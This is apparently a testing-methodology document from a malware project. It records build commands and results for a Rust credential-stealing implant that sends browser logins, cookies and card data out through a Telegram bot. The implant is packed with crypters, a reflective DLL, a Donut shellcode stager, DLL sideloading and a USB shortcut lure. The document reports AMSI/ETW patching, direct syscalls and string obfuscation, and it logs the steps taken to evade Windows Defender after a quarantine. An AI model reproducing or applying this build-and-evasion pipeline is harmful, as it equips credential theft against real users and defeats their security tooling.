# Testing Methodology & Measured Results

Version: 2026-11 · Companion: `docs/CRYPTER_ARCHITECTURE.md`

---

## 1. Isolation policy (laboratory rules)

1. Windows samples run **only** in a snapshotted, non-domain VM (Hyper-V /
   VMware), Defender configured explicitly for the experiment.
2. No personal accounts, no production network, no USB autorun-capable host.
3. Revert to the snapshot after every run; export results (detection names,
   hashes, timings) before reverting.
4. Telegram bot used for exfil is a disposable lab bot; token rotated after the
   campaign.
5. Operator machine (this Linux host) never executes Windows artifacts.

---

## 2. Reproducible build

Toolchain used for measurements:

- `rustc 1.99.1 (stable-x86_64-unknown-linux-gnu, rustup)`
- target `x86_64-pc-windows-gnu`, `mingw-w64-gcc 16.2.0`
- Donut v1.1 (prebuilt release), `ImageMagick`/Pillow for icon, `pylnk3` for `.lnk`

Build sequence (all commands from repo root):

```bash
# 1. agent (Telegram-only; .env provides TG_TOKEN/TG_CHAT)
~/.cargo/bin/cargo build -p implant --release --target x86_64-pc-windows-gnu

# 2. temp-exec loader
cargo run -q -p crypter-packer -- \
  target/x86_64-pc-windows-gnu/release/implant.exe crypter/loader/src
~/.cargo/bin/cargo build -p crypter-loader --release --target x86_64-pc-windows-gnu

# 3. reflective DLL
cargo run -q -p crypter-packer -- \
  target/x86_64-pc-windows-gnu/release/implant.exe crypter/dll-loader/src --reflective
~/.cargo/bin/cargo build -p crypter-dll --release --target x86_64-pc-windows-gnu

# 4. Donut stager
donut -a 2 -f 1 -i target/.../implant.exe -o implant.bin
# XOR-encrypt (32 B random key) + embed into stager.c / stager_dll.c
x86_64-w64-mingw32-gcc -O2 -s -mwindows -o stager.exe stager.c
x86_64-w64-mingw32-gcc -O2 -s -shared -mwindows -o wmpsvc.dll stager_dll.c
```

---

## 3. Automated checks (run on every build)

| Check | Command | Purpose |
|---|---|---|
| Crypto unit tests | `cargo test -p crypter-common` | roundtrip / wrong-key / tamper |
| End-to-end pack test | `cryptertest` (test crate) | decrypt(payload.enc) == implant; blob embedded; tamper/wrong-key rejected |
| Server tests | `cargo test -p c2-server` | relay, frames, loot store, traversal sanitization |
| String hygiene | `strings <artifact> \| grep -c <s>` | plaintext endpoints/methods = 0 |
| Export check | `objdump -p <dll>` | `DllMain`/`Run` exported |
| Entropy | Python shannon entropy | packed blob ≈ 8.0 |
| Offline decryptor | synthetic DB fixture | logins/cookies/cards decrypt |

---

## 4. Measured results (2026-11, this host)

### 4.1 Artifact matrix

| Artifact | Size (B) | Entropy | SHA-256 (prefix) |
|---|---|---|---|
| implant.exe | 1,341,440 | 6.5227 | `4bd3d398…` |
| payload.enc | 1,341,456 | 7.9999 | (per-build) |
| loader.exe | 1,712,640 | 7.8661 | `fd3d6a2a…` |
| wmpdui.dll | 1,625,088 | 7.9029 | `ad77d444…` |
| wmpsvc.dll (AEAD) | 1,424,384 | 7.9872 | `c28869e5…` |
| stager.exe (AEAD) | 1,428,480 | 7.9857 | `795f4260…` |
| donut shellcode | 1,361,004 | ~8.0 | (per-build) |

### 4.2 String hygiene (plaintext occurrences)

| Token | implant | loader | wmpdui.dll | wmpsvc.dll | stager.exe |
|---|---|---|---|---|---|
| `api.telegram.org` | 0 | 0 | 0 | 0 | 0 |
| `sendDocument` / `sendMessage` / `getUpdates` | 0 | 0 | 0 | 0 | 0 |
| `Login Data` / `Cookies` / `Web Data` / `History` | 0 | 0 | 0 | 0 | 0 |
| `WindowsRuntimeHost` / `winhost.exe` | 0 | 0 | 0 | 0 | 0 |
| `--no-install` | 0 | 0 | 0 | 0 | 0 |
| `EtwEventWrite` / `AmsiScanBuffer` | 0 | 1 / 1 | 1 / 1 | 0 | 0 |

Interpretation: loader/DLL/stagers hide the agent strings inside the AEAD blob;
the C stager even hides its ETW/AMSI patch strings. Residual risk: the implant
image itself still carries browser/persist strings (visible only to the
temp-exec scan or post-decryption memory).

### 4.3 Crypto

- Unit tests: 3/3 pass (`roundtrip`, `wrong_key_fails`, `tamper_fails`).
- End-to-end: `decrypt(payload.enc) == implant.exe` for both loader and DLL
  packs; blob contiguously embedded; tamper and wrong-key rejected.
- Throughput: **~1800 MB/s** decrypt (measured on Linux host; loader cost <1 ms).
- Shellcode AEAD cross-implementation: Monocypher (C) decrypts the
  XChaCha20-Poly1305 blob to the exact Donut shellcode — PASS; tamper
  rejection — PASS (Linux harness, same code path as the Windows stager).
- Browser copy path: `collect_browsers` uses direct `CopyFileExW`
  (`fs::copy`); a normal harvest spawns **no `cmd.exe`**. Trade-off: file access
  is attributed to the implant process instead of a signed shell.
- Machine binding: `--bind` pack decrypts to the implant with the matching
  MachineGuid (PASS); a different GUID is rejected (PASS); the derived key is
  not stored (`KEY` is all zeros).
- Syscall variant static verification (`wmpsvc2.dll`): disassembly shows the
  naked stub `mov rcx,r10; mov g_ssn(%rip),eax; jmp *g_sc(%rip)`; exports
  `Run`; AEAD blob embedded; no plaintext `NtAllocateVirtualMemory`,
  `NtProtectVirtualMemory`, `EnumWindows`, `ntdll.dll`, `EtwEventWrite`,
  `AmsiScanBuffer`. Runtime status: **experimental** (VM run pending).

### 4.4 Build performance

| Target | Wall time (release, cached deps) |
|---|---|
| implant | ~10–12 s |
| crypter-loader | ~2 s |
| crypter-dll | ~2 s |
| C stager (mingw) | <2 s |

---

## 5. AV/EDR detection experiments (controlled)

### 5.1 Environment

- Windows 11 VM, snapshot "clean", Defender real-time + cloud + Tamper
  Protection **on** for the default run.
- Run matrix: one variant per snapshot revert. Deliver via copied file (no
  MOTW) and via USB (as produced). Capture: Protection History (threat name,
  affected file, status), Defender operational event log (ID 1116/1117), and
  whether the Telegram document arrives (functional check).
- In-VM runner: `tools/vm_run_variant.ps1 -Path <variant> [-Arguments ...]`
  records SHA-256, process survival, Defender status and new detections to a
  JSON report. Revert the snapshot before each variant.
- Aggregate: `python3 tools/matrix_report.py <results_dir> [out.md]` → markdown
  matrix (variant, hash, alive, RTP, tamper, detections) + summary counts.

### 5.2 Matrix template

| Variant | Delivery | RTP | Result | Detection | Functional |
|---|---|---|---|---|---|
| implant (in-process decrypt) | file | on | quarantined | `PWS:MSIL/Polazert.GA!MTB` | no |
| loader temp-exec (current) | USB | on | ? | ? | ? |
| wmpdui.dll via rundll32 | file | on | ? | ? | ? |
| wmpsvc.dll via rundll32 | file | on | ? | ? | ? |
| stager.exe | file | on | ? | ? | ? |
| each variant, exclusion added | file | off | n/a | n/a | expected yes |

### 5.3 Observed datapoint (real)

- Variant: original loader chain with **in-process** browser credential
  decryption (SQLite + DPAPI + AES-GCM in the agent).
- Result: `PWS:MSIL/Polazert.GA!MTB`, status **Quarantined**, process-level
  block ("This program is dangerous and captures user passwords").
- Mitigation applied and measured: raw browser exfil (copy via `cmd.exe`,
  DPAPI key only), removed `rusqlite`/`aes-gcm` imports, endpoint string
  obfuscation. Re-test pending on the Windows VM (documented, not assumed).

### 5.4 False-positive methodology

To separate signature hits from real behavior, run the same harness with a
**benign payload** (e.g., a GUI stub that only sleeps) packed through the same
pipeline. Detections that persist with the benign payload are packer/loader
FPs; detections that appear only with the harvest payload are behavior-based.
Track per-variant FP/TP in the matrix.

---

## 6. Limitations of the measurements

1. Windows-side detections could not be re-executed from the Linux host; §5.2
   must be completed on the VM.
2. Entropy is whole-file Shannon; section-level entropy (e.g., `.rsrc`,
   `.text`) is more diagnostic and is planned.
3. Decrypt throughput was measured on the operator CPU; loader-side cost on
   target hardware is expected lower but still negligible.
4. `sideload.ps1` and the USB `.lnk` lure are syntax/logic reviewed only
   (no Windows PowerShell available here).
5. Donut shellcode execution (RWX + thread) is verified statically only;
   runtime TLS behavior of the Rust agent under Donut is unverified.
